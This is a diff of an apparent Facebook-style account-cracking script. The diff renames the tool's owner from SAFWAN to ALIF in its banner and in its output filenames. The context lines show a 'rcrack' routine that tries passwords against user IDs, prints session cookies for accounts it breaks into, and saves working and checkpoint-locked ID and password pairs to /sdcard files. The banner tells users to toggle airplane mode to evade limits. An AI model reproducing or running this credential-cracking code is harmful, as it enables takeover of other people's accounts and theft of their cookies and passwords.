@@ -220,7 +220,7 @@ def xxr():
         print(f'{x}\033[38;5;46m[\033[1;31m+\033[38;5;46m] THE PROCESS HAS BEEN STARTED')
         print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] TOTAL IDS     \033[1;91m: \033[38;5;46m {xr}\033[38;5;46m'+tl)
         print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] WORK COUNTRY  \033[1;91m:  \033[38;5;46mBANGLADESH')
-        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] TOOL OWNER   \033[1;91m : \033[38;5;46m SAFWAN')
+        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] TOOL OWNER   \033[1;91m : \033[38;5;46m ALIF')
         print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] USE NETWORK   \033[1;91m:  \033[38;5;46m2G, 3G, 4G, 5G ')
         print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
         print(f"\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
@@ -277,14 +277,14 @@ def rcrack(uid,pwx,tl):
                 if 'Active' in status:
                 	print('\r\r\033[1;31m[\033[38;5;46mSAFWAN-OK💚\033[1;31m]\033[38;5;46m ' +uid+ ' \033[1;31m|\033[38;5;46m ' +ps+    '  \n[‎🌺]\033[0;93m COOKIE = \033[38;5;46m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/SAFWAN-OK.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/MR-ALIF-OK.txt', 'a').write( uid+' | '+ps+' \n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-               #print('\r\r\33[1;31m [SAFWAN-CP💔] ' +uid+ ' | ' +ps+        '  \n[‎🌺]\033[0;93m COOKIE = \033[38;5;46m'+coki+  '  ''  \033[0;97m')
-                open('/sdcard/𝐌𝐑-𝐓𝐀𝐍-CP.txt', 'a').write( uid+' | '+ps+' \n')
+               #print('\r\r\33[1;31m [ALIF-CP💔] ' +uid+ ' | ' +ps+        '  \n[‎🌺]\033[0;93m COOKIE = \033[38;5;46m'+coki+  '  ''  \033[0;97m')
+                open('/sdcard/MR-ALIF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
